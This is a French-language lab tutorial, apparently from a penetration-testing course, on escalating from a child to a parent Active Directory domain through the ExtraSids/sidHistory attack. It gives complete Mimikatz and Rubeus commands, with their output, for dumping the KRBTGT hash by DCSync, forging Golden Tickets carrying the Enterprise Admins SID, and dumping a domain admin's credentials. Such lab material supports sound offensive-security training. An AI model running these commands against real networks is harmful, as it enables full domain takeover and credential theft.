# Attacking Domain Trusts - Child -> Parent Trusts - from Windows

***

### <mark style="color:blue;">**Introduction à l'historique SID**</mark>

L'attribut **sidHistory** est utilisé dans les scénarios de migration. Si un utilisateur d'un domaine est migré vers un autre domaine, un nouveau compte est créé dans ce second domaine. Le SID de l'utilisateur original sera ajouté à l'attribut d'historique SID du nouveau compte, garantissant ainsi que l'utilisateur peut toujours accéder aux ressources du domaine d'origine.

L'historique SID est conçu pour fonctionner entre les domaines, mais peut également fonctionner dans le même domaine. En utilisant Mimikatz, un attaquant peut réaliser une injection d'historique SID et ajouter un compte administrateur à l'attribut d'historique SID d'un compte qu'il contrôle. Lorsqu'il se connecte avec ce compte, tous les SIDs associés au compte sont ajoutés au jeton de l'utilisateur.

Ce jeton est utilisé pour déterminer aux ressources auxquelles le compte peut accéder. Si le SID d'un compte Administrateur de Domaine est ajouté à l'attribut d'historique SID de ce compte, alors ce compte pourra exécuter DCSync et créer un Golden Ticket ou un ticket-granting ticket Kerberos (TGT), ce qui nous permettra de nous authentifier en tant que n'importe quel compte dans le domaine de notre choix pour assurer une persistance ultérieure.

***

### <mark style="color:blue;">**Attaque ExtraSids – Mimikatz**</mark>

Cette attaque exploite le mécanisme **sidHistory** dans un domaine enfant compromis pour injecter le SID du groupe des Administrateurs d'Entreprise du domaine parent. En ajoutant ce SID dans l'attribut sidHistory d'un compte (même inexistant), l'attaquant obtient des privilèges administratifs sur le domaine parent via un Golden Ticket. Pour réaliser l'attaque, il faut récupérer plusieurs éléments avec Mimikatz : le hash NT du compte KRBTGT du domaine enfant, le SID et le FQDN du domaine enfant, le nom d'un utilisateur cible (même fictif) et le SID du groupe Administrateurs d'Entreprise du domaine racine. Une fois ces données obtenues, l'attaquant peut créer un Golden Ticket pour compromettre totalement le domaine parent.

<mark style="color:orange;">**Obtention du hash NT du compte KRBTGT à l'aide de Mimikatz**</mark>

```powershell
PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

Nous pouvons utiliser la fonction **Get-DomainSID** de PowerView pour obtenir le SID du domaine enfant, mais ce SID est également visible dans la sortie de Mimikatz ci-dessus.

<mark style="color:orange;">**Utilisation de Get-DomainSID**</mark>

```powershell
PS C:\htb> Get-DomainSID
```

```
S-1-5-21-2806153819-209893948-922872689
```

Ensuite, nous pouvons utiliser **Get-DomainGroup** depuis PowerView pour obtenir le SID du groupe des Administrateurs d'Entreprise dans le domaine parent. Nous pourrions également le faire avec la cmdlet **Get-ADGroup** via une commande telle que :

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

**Obtention du SID du groupe des Administrateurs d'Entreprise à l'aide de Get-DomainGroup**

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```
distinguishedname                                       objectsid                                    
-----------------                                       ---------                                    
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```
{% endcode %}

* Le hash KRBTGT pour le domaine enfant : **9d765b482771505cbe97411065964d5f**
* Le SID du domaine enfant : **S-1-5-21-2806153819-209893948-922872689**
* Le nom d'un utilisateur cible dans le domaine enfant (inutile qu'il existe pour créer notre Golden Ticket !) : Nous choisirons un faux utilisateur : **hacker**
* Le FQDN du domaine enfant : **LOGISTICS.INLANEFREIGHT.LOCAL**
* Le SID du groupe des Administrateurs d'Entreprise du domaine racine : **S-1-5-21-3842939050-3880317879-2865463114-519**

**Utilisation de ls pour vérifier l'absence d'accès**

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```

```
ls : Accès refusé  
```

En utilisant Mimikatz et les données collectées ci-dessus, nous pouvons créer un Golden Ticket pour accéder à toutes les ressources du domaine parent.

<mark style="color:orange;">**Création d'un Golden Ticket avec Mimikatz**</mark>

```powershell
PS C:\htb> mimikatz.exe
```

{% code overflow="wrap" fullWidth="true" %}
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
{% endcode %}

{% code fullWidth="true" %}
```
Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session
```
{% endcode %}

Nous pouvons confirmer que le ticket Kerberos pour l'utilisateur **hacker** (qui n'existe pas réellement) est désormais en mémoire.

**Confirmation de la présence du ticket Kerberos en mémoire avec klist**

```powershell
PS C:\htb> klist
```

{% code fullWidth="true" %}
```
Current LogonId is 0:0xf6462

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL  
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL  
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)  
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent  
        Start Time: 3/28/2022 19:59:50 (local)  
        End Time:   3/25/2032 19:59:50 (local)  
        Renew Time: 3/25/2032 19:59:50 (local)  
        Session Key Type: RSADSI RC4-HMAC(NT)  
        Cache Flags: 0x1 -> PRIMARY  
        Kdc Called:
```
{% endcode %}

À partir de là, il est possible d'accéder à n'importe quelle ressource dans le domaine parent, et nous pourrions compromettre ce domaine de plusieurs manières.

<mark style="color:orange;">**Liste complète du lecteur C: du contrôleur de domaine**</mark>

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```

***

### <mark style="color:blue;">**Attaque ExtraSids – Rubeus**</mark>

Nous pouvons également exécuter cette attaque à l'aide de **Rubeus**. Tout d'abord, nous confirmerons à nouveau que nous n'avons pas accès au système de fichiers du contrôleur de domaine du domaine parent.

<mark style="color:orange;">**Utilisation de ls pour confirmer l'absence d'accès avant d'exécuter Rubeus**</mark>

```powershell
PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
```

```
ls : Accès refusé  
```

Ensuite, nous allons formuler notre commande Rubeus en utilisant les données récupérées ci-dessus. Le paramètre **/rc4** correspond au hash NT du compte KRBTGT. Le paramètre **/sids** indiquera à Rubeus de créer notre Golden Ticket en nous conférant les mêmes droits que les membres du groupe des Administrateurs d'Entreprise dans le domaine parent.

<mark style="color:orange;">**Création d'un Golden Ticket avec Rubeus**</mark>

{% code overflow="wrap" fullWidth="true" %}
```powershell
PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
{% endcode %}

```
[+] Ticket successfully imported!
```

Une fois de plus, nous pouvons vérifier que le ticket est bien en mémoire en utilisant la commande **klist**.

<mark style="color:orange;">**Confirmation du ticket en mémoire avec klist**</mark>

```powershell
PS C:\htb> klist
```

```
Current LogonId is 0:0xf6495

Cached Tickets: (1)

#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL  
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL  
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)  
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent  
        Start Time: 3/29/2022 10:06:41 (local)  
        End Time:   3/29/2022 20:06:41 (local)  
        Renew Time: 4/5/2022 10:06:41 (local)  
        Session Key Type: RSADSI RC4-HMAC(NT)  
        Cache Flags: 0x1 -> PRIMARY  
        Kdc Called:
```

Enfin, nous pouvons tester cet accès en réalisant une attaque DCSync contre le domaine parent, en ciblant l'utilisateur **lab\_adm** (Administrateur de Domaine) dans le domaine **INLANEFREIGHT**.\\

***

### <mark style="color:blue;">**Réalisation d'une attaque DCSync**</mark>

```powershell
PS C:\Tools\mimikatz\x64> .\mimikatz.exe
```

Puis, dans Mimikatz :

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

Lorsque nous traitons plusieurs domaines et que notre domaine cible n'est pas le même que celui de l'utilisateur, nous devons spécifier exactement le domaine sur lequel exécuter l'opération DCSync sur le contrôleur de domaine concerné. La commande serait alors :

```
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

La sortie sera similaire à celle précédemment affichée.

***
